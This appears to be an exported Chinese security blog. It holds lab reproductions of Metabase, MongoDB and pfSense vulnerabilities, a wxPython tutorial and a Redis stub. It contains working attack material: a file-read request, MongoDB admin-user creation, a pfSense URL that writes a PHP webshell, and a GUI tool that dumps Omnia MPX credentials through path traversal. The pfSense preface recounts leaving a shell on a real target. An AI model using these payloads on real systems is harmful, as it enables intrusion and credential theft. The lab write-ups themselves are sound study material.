<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line">		</span><br><span class="line">		靶机部署:</span><br><span class="line">		vulhub/metabase/CVE-2021-41277</span><br><span class="line">		sudo docker-compose up -d // 开启环境</span><br><span class="line">		服务启动后，访问靶机的3000端口可以查看到Metabase的安装引导页面，我们填写初始账号密码，并且跳过后续的数据库填写的步骤即可完成安装，出现下图界面即安装完成</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/11/ThpmVLxvIg1zPyo.png" alt="image-20220711151311035"></p>
<h2 id="漏洞复现">1.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、拼接访问/api/geojson?url=file:////etc/passwd可以实现任意文件读取。</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/11/WwAnisXmjRrydZU.png" alt="image-20220711151458954"></p>
<h2 id="漏洞修复">1.5. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将Metabase升级至安全版本。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB应用</category>
      </categories>
  </entry>
  <entry>
    <title>Mongodb</title>
    <url>/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb.html</url>
    <content><![CDATA[<h1 id="Mongodb未授权访问">1. Mongodb未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作而且可以远程访问数据库！</span><br></pre></td></tr></table></figure>

<p>More info : 该服务默认开放端口27017</p>
<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者 Kali 192.168.179.129 </span><br><span class="line">靶机 ubuntu 192.168.179.130 -- 需安装mongodb环境</span><br><span class="line"></span><br><span class="line">	靶机部署：</span><br><span class="line">	sudo docker pull mongo // 下载mongodb的docker环境</span><br><span class="line">	sudo docker run -d -p 27017:27017 --name mongodb mongo // 开启服务</span><br><span class="line">	sudo docker ps // 查看docker进程信息</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/04/gLD6cWCVRuZ5bwy.png"></p>
<p>More info: 访问靶机地址:27017看到上图结果为搭建成功</p>
<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole // 使用msf工具</span><br><span class="line">search mongodb_login // 查找利用模块</span><br><span class="line">use 0 </span><br><span class="line">set rhosts 192.168.179.130 //设置目标地址</span><br><span class="line">run	//执行</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/04/bhIrve4ztVPMOZn.png" alt="msf.png"></p>
<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongo --host 192.168.179.130 -p 27017 // 登录mongodb服务器</span><br><span class="line">show users // 查看用户信息</span><br><span class="line">db.version() //查看数据库版本信息 </span><br><span class="line">use admin //切换到管理员账号 </span><br><span class="line"></span><br><span class="line">db.createUser //创建ssh用户</span><br><span class="line">(</span><br><span class="line">	&#123;</span><br><span class="line">	user:&quot;hacker&quot;,</span><br><span class="line">	pwd:&quot;Aa123456.&quot;,</span><br><span class="line">	roles:[ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>More info: 后续ssh登录服务器，利用完毕</p>
<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、如果仅对内网服务器提供服务，建议禁止将MongoDB服务发布到互联网上，并在主机上通过防火墙限制访问源IP。 </span><br><span class="line">2、启动基于角色的登录认证功能</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Pfsense</title>
    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Pfsense.html</url>
    <content><![CDATA[<h1 id="Pfsense-RCE-CVE-2021-41282">1. Pfsense RCE CVE-2021-41282</h1><p>前言:在2022国护的时候发现异常攻击流量，溯源时发现目标存在Pfsense防火墙，并用弱口令admin&#x2F;pfsense成功登录，之前写shell成功然后web被打崩了，今天偶尔发现这个web又重启了，虽然弱口令修复了，但是马没删。</p>
<h2 id="影响版本">1.1. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pfSense CE version &lt;= 2.5.2</span><br><span class="line">pfSense Plush version &lt; 22.01</span><br></pre></td></tr></table></figure>

<h2 id="前提条件">1.2. 前提条件:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该漏洞利用需要登录后台</span><br></pre></td></tr></table></figure>

<h2 id="POC">1.3. POC</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用该POC会在网站根目录写上a.php的木马，执行参数为a</span><br><span class="line">/diag_routes.php?isAjax=1&amp;filter=.*/!d;&#125;;s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23</span><br></pre></td></tr></table></figure>



<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221011215541115.png" alt="image-20221011215541115"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221011215558684.png" alt="image-20221011215558684"></p>
]]></content>
      <categories>
        <category>网络设备</category>
      </categories>
  </entry>
  <entry>
    <title>PythonGUI</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Python/PythonGUI-wxpython.html</url>
    <content><![CDATA[<h1 id="PythonGUI-wxpython">1. PythonGUI-wxpython</h1><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221013094208670.png" alt="image-20221013094208670"></p>
<h2 id="1、窗口的创建">1.1. 1、窗口的创建</h2><h3 id="封装前">1.1.1. 封装前</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line">app = wx.App()  <span class="comment"># 创建对象</span></span><br><span class="line">frm = wx.Frame(<span class="literal">None</span>, title=<span class="string">&quot;FirstGUI&quot;</span>)  <span class="comment"># 创建窗口</span></span><br><span class="line">frm.Show()  <span class="comment"># 显示窗口</span></span><br><span class="line">app.MainLoop()	<span class="comment"># 让主事件进入循环，维持窗口</span></span><br></pre></td></tr></table></figure>

<h3 id="封装后">1.1.2. 封装后</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, title=<span class="string">&#x27;WxPython 窗口&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="comment"># 窗口初始化所调用的方法等于__init__</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220930130944285.png" alt="image-20220930130944285"></p>
<h2 id="2、面板的添加">1.2. 2、面板的添加</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, title=<span class="string">&#x27;WxPython 窗口&#x27;</span>)</span><br><span class="line">        self.Centre()  <span class="comment"># 设置窗口出现位置居中</span></span><br><span class="line">        wx.Panel(parent=self)  <span class="comment"># parent指定父类,添加到那个窗口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等于__del__</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnExit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序退出&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220930162208660.png" alt="image-20220930162208660"></p>
<h2 id="3、控件的添加">1.3. 3、控件的添加</h2><h3 id="创建按钮">1.3.1. 创建按钮</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wx.Button(parent=panel, size=(200, 50), pos=(100, 20), label=&quot;Click Button&quot;)  # 在面板上创建按钮，pos 表示位置， size 表示大小</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220930164737938.png" alt="image-20220930164737938"></p>
<h3 id="获取TextCtrl的文本内容">1.3.2. 获取TextCtrl的文本内容</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, size=(<span class="number">650</span>, <span class="number">500</span>), title=<span class="string">&#x27;WxPython 窗口&#x27;</span>)</span><br><span class="line">        panel = wx.Panel(parent=self)</span><br><span class="line">        self.Centre()</span><br><span class="line">        self.button1 = wx.Button(parent=panel, label=<span class="string">&quot;开始检测&quot;</span>, size=(<span class="number">100</span>, <span class="number">35</span>), pos=(<span class="number">500</span>, <span class="number">50</span>))</span><br><span class="line">        self.static_URL = wx.StaticText(parent=panel, size=(<span class="number">50</span>, <span class="number">35</span>), pos=(<span class="number">10</span>, <span class="number">60</span>), label=<span class="string">&quot;URL:&quot;</span>)</span><br><span class="line">        self.staticText = wx.StaticText(parent=panel, size=(<span class="number">615</span>, <span class="number">350</span>), pos=(<span class="number">10</span>, <span class="number">100</span>))</span><br><span class="line">        self.Bind(wx.EVT_BUTTON, self.on_click)</span><br><span class="line">        self.staticText.SetOwnBackgroundColour((<span class="number">192</span>, <span class="number">192</span>, <span class="number">192</span>, <span class="number">255</span>))</span><br><span class="line">        self.TextCtrl = wx.TextCtrl(parent=panel, size=(<span class="number">420</span>, <span class="number">35</span>), pos=(<span class="number">50</span>, <span class="number">50</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_click</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="comment"># 将用户输入的值打印在标签上</span></span><br><span class="line">        URL = self.TextCtrl.GetValue()</span><br><span class="line">        self.staticText.SetLabelText(URL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221001164915780.png" alt="image-20221001164915780"></p>
<h2 id="4、事件处理">1.4. 4、事件处理</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220930160109525.png" alt="image-20220930160109525"></p>
<h3 id="单个按钮触发事件">1.4.1. 单个按钮触发事件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, title=<span class="string">&#x27;WxPython 窗口&#x27;</span>, size=(<span class="number">500</span>, <span class="number">400</span>))</span><br><span class="line">        self.Centre()</span><br><span class="line">        panel = wx.Panel(parent=self)</span><br><span class="line">        button = wx.Button(parent=panel, size=(<span class="number">200</span>, <span class="number">50</span>), pos=(<span class="number">100</span>, <span class="number">20</span>), label=<span class="string">&quot;Click Button&quot;</span>)  <span class="comment"># 在面板上创建按钮，pos 表示位置， size 表示大小</span></span><br><span class="line">        self.staticText = wx.StaticText(parent=panel, size=(<span class="number">200</span>, <span class="number">100</span>), pos=(<span class="number">0</span>, <span class="number">0</span>))  <span class="comment"># 在面板上创建文本框</span></span><br><span class="line">        self.Bind(wx.EVT_BUTTON, self.on_click, button)  <span class="comment"># self.Bind绑定事件处理程序，wx.EVT_BUTTON代表单击事件，on_click代表事件处理方法，需要自己定义</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_click</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.staticText.SetLabelText(<span class="string">&#x27;点击成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220930193043173.png" alt="image-20220930193043173"></p>
<h3 id="多个按钮触发事件">1.4.2. 多个按钮触发事件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, title=<span class="string">&#x27;WxPython 窗口&#x27;</span>)</span><br><span class="line">        panel = wx.Panel(parent=self)</span><br><span class="line">        button1 = wx.Button(parent=panel, label=<span class="string">&quot;Button1&quot;</span>, <span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">        button2 = wx.Button(parent=panel, label=<span class="string">&quot;Button2&quot;</span>, <span class="built_in">id</span>=<span class="number">2</span>, pos=(<span class="number">100</span>, <span class="number">50</span>))</span><br><span class="line">        self.staticText = wx.StaticText(parent=panel, size=(<span class="number">200</span>, <span class="number">100</span>), pos=(<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">        self.Bind(wx.EVT_BUTTON, self.on_click, <span class="built_in">id</span>=<span class="number">1</span>, id2=<span class="number">2</span>)  <span class="comment"># 用id区分按钮</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_click</span>(<span class="params">self, event</span>):</span><br><span class="line">        event_id = event.GetId()</span><br><span class="line">        <span class="keyword">if</span> event_id == <span class="number">1</span>:</span><br><span class="line">            self.staticText.SetLabelText(<span class="string">&#x27;button1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> event_id == <span class="number">2</span>:</span><br><span class="line">            self.staticText.SetLabelText(<span class="string">&#x27;button2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220930194233613.png" alt="image-20220930194233613"></p>
<h3 id="编写第一个GUI漏洞检测工具">1.4.3. 编写第一个GUI漏洞检测工具</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">poc = <span class="string">&quot;logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, size=(<span class="number">650</span>, <span class="number">500</span>), title=<span class="string">&#x27;Telos Alliance Omnia MPX Node Overview 文件读取漏洞&#x27;</span>)</span><br><span class="line">        panel = wx.Panel(parent=self)</span><br><span class="line">        self.Centre()</span><br><span class="line">        self.button = wx.Button(parent=panel, label=<span class="string">&quot;开始检测&quot;</span>, size=(<span class="number">100</span>, <span class="number">35</span>), pos=(<span class="number">500</span>, <span class="number">20</span>))</span><br><span class="line">        self.text_URL = wx.StaticText(parent=panel, size=(<span class="number">50</span>, <span class="number">35</span>), pos=(<span class="number">10</span>, <span class="number">30</span>), label=<span class="string">&quot;URL:&quot;</span>)</span><br><span class="line">        self.GetURL = wx.TextCtrl(parent=panel, size=(<span class="number">420</span>, <span class="number">35</span>), pos=(<span class="number">50</span>, <span class="number">20</span>))</span><br><span class="line">        self.OutputResult = wx.TextCtrl(parent=panel, size=(<span class="number">615</span>, <span class="number">350</span>), pos=(<span class="number">10</span>, <span class="number">100</span>), style=<span class="number">1073741856</span>)  <span class="comment"># style=1073741856运行编辑框换行</span></span><br><span class="line">        self.OutputResult.SetOwnBackgroundColour((<span class="number">192</span>, <span class="number">192</span>, <span class="number">192</span>, <span class="number">255</span>))</span><br><span class="line">        self.Bind(wx.EVT_BUTTON, self.on_click)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_click</span>(<span class="params">self, event</span>):</span><br><span class="line">        test_url = self.GetURL.GetValue()</span><br><span class="line">        resp = requests.get(<span class="string">f&#x27;<span class="subst">&#123;test_url&#125;</span><span class="subst">&#123;poc&#125;</span>&#x27;</span>, headers=headers)</span><br><span class="line">        json = resp.json()</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(json)):</span><br><span class="line">                self.OutputResult.WriteText(<span class="string">f&#x27;id:<span class="subst">&#123;json[i][<span class="string">&quot;id&quot;</span>]&#125;</span>\n&#x27;</span>)</span><br><span class="line">                self.OutputResult.WriteText(<span class="string">f&#x27;usrename:<span class="subst">&#123;json[i][<span class="string">&quot;username&quot;</span>]&#125;</span>\n&#x27;</span>)</span><br><span class="line">                self.OutputResult.WriteText(<span class="string">f&#x27;password:<span class="subst">&#123;json[i][<span class="string">&quot;password&quot;</span>]&#125;</span>\n\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.OutputResult.AppendText(<span class="string">&quot;不存在该漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221001201232837.png" alt="image-20221001201232837"></p>
<h2 id="5、布局管理">1.5. 5、布局管理</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221001102002650.png" alt="image-20221001102002650"></p>
<h3 id="Boxsizer">1.5.1. Boxsizer</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag--对齐标志</span><br><span class="line">wx.ALIGN_TOP				顶端对齐</span><br><span class="line">wx.ALIGN_BOTTOM				底端对齐</span><br><span class="line">wx.ALIGN_LEFT				左对齐</span><br><span class="line">wx.ALIGN_RIGHT 				右对齐</span><br><span class="line">wx.ALIGN_CENTER				居中对齐</span><br><span class="line">wx.ALIGN_CENTER_VERTICAL 	垂直居中对齐</span><br><span class="line">wx.ALIGN_CENTER_HORIZONTAL	水平居中对齐</span><br><span class="line"></span><br><span class="line">flag--边框标志</span><br><span class="line">wx.TOP						设置顶部边框，边框的宽度需要通过Add()方法的border参数设置</span><br><span class="line">wx.BOTTOM</span><br><span class="line">wx.LEFT</span><br><span class="line">wx.RIGHT</span><br><span class="line">wx.ALL						设置四面都有边框</span><br><span class="line"></span><br><span class="line">flag--调整尺寸标志</span><br><span class="line">wx.EXPAND					调整子窗口（或控件）完全填满有效空间</span><br><span class="line">wx.SHAPED					调整子窗口（或控件）填充有效空间，单保持高宽比</span><br><span class="line">wx.FIXED_MINSIZE			调整子窗口（或控件）为最小尺寸</span><br><span class="line">wx.RESERVE_SPACE_EVENT_IF_HIDDEN		</span><br></pre></td></tr></table></figure>

<h2 id="6、Dialog">1.6. 6、Dialog</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, title=<span class="string">&#x27;WxPython 窗口&#x27;</span>)</span><br><span class="line">        self.Centre()  <span class="comment"># 设置窗口出现位置居中</span></span><br><span class="line">        self.panel = wx.Panel(parent=self)  <span class="comment"># parent指定父类,添加到那个窗口</span></span><br><span class="line">        self.Import_Button = wx.Button(self.panel, size=(<span class="number">40</span>, <span class="number">25</span>), label=<span class="string">&quot;导入&quot;</span>, <span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">        self.Bind(wx.EVT_BUTTON, self.select_file, <span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">select_file</span>(<span class="params">self, event</span>):</span><br><span class="line">        dialog = wx.FileDialog(self.panel, message=<span class="string">&#x27;打开文件夹&#x27;</span>, style=wx.DD_CHANGE_DIR)</span><br><span class="line">        <span class="keyword">if</span> dialog.ShowModal() == wx.ID_OK:</span><br><span class="line">            path = dialog.GetPath()</span><br><span class="line">            <span class="built_in">print</span>(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Myapp</span>(wx.App):</span><br><span class="line">    <span class="comment"># 窗口初始化所调用的方法等于__init__</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = Frame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = Myapp()</span><br><span class="line">    app.MainLoop()</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221017104718787.png" alt="image-20221017104718787"></p>
<h2 id="7、菜单栏">1.7. 7、菜单栏</h2><p>注意：若在设置菜单栏时同时使用的时Boxsizer布局需要在设置panel的Fix()属性&#x3D;&#x3D;&gt;<code>self.panel.Fit()</code>，才能正常使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myFrame</span>(wx.Frame):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        wx.Frame.__init__(self, parent=<span class="literal">None</span>, title=<span class="string">&quot;testMenuBar&quot;</span>, size=(<span class="number">800</span>, <span class="number">675</span>), style=<span class="number">541072384</span>)</span><br><span class="line">        self.Centre()</span><br><span class="line">        self.mb = wx.MenuBar() <span class="comment"># 创建菜单栏</span></span><br><span class="line">        m = wx.Menu() <span class="comment"># 创建菜单</span></span><br><span class="line">        id_open = <span class="string">&quot;&quot;</span></span><br><span class="line">        m.Append(<span class="number">1</span>,<span class="string">&quot;文件目录&quot;</span>) <span class="comment"># 需要一个id参数以及item名称,id可以是任意数字，后续绑定事件时需要使用</span></span><br><span class="line">        m.Append(<span class="number">2</span>,<span class="string">&quot;退出程序&quot;</span>)</span><br><span class="line">        self.mb.Append(m,<span class="string">&quot;打开&quot;</span>)</span><br><span class="line">        self.SetMenuBar(self.mb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myApp</span>(wx.App):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">OnInit</span>(<span class="params">self</span>):</span><br><span class="line">        frame = myFrame()</span><br><span class="line">        frame.Show()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = myApp()</span><br><span class="line">    app.MainLoop()</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221116174557857.png" alt="image-20221116174557857"></p>
<h2 id="python打包exe">1.8. python打包exe</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先需要安装pyinstaller模块</span><br><span class="line">1、python3 -m pip install pyinstaller</span><br><span class="line">其次打包py文件为exe</span><br><span class="line">2、pyinstaller py文件路径</span><br><span class="line">exe文件存在于dist/GUI目录下</span><br><span class="line">3、导入库需要保持最小使用原则，不然生成的文件会很大</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221001145510693.png" alt="image-20221001145510693"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221001145700788.png" alt="image-20221001145700788"></p>
]]></content>
      <categories>
        <category>高级语言</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>Redis</title>
    <url>/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html</url>
    <content><![CDATA[<h1 id="redis未授权访问">1. redis未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis 未授权访问是因为一些 Redis 服务绑定到公共接口，甚至没有密码身份验证保护。部分 Redis 绑定在0.0.0.0:6379，并且没有开启认证（这是 Redis 的默认配置），而又暴露在公网上，这样就会导致任意用户在可以访问此公网的情况下未授权访问 Redis 以及读取Redis 的数据。</span><br></pre></td></tr></table></figure>

<p>More info : 该服务默认开放端口6379</p>
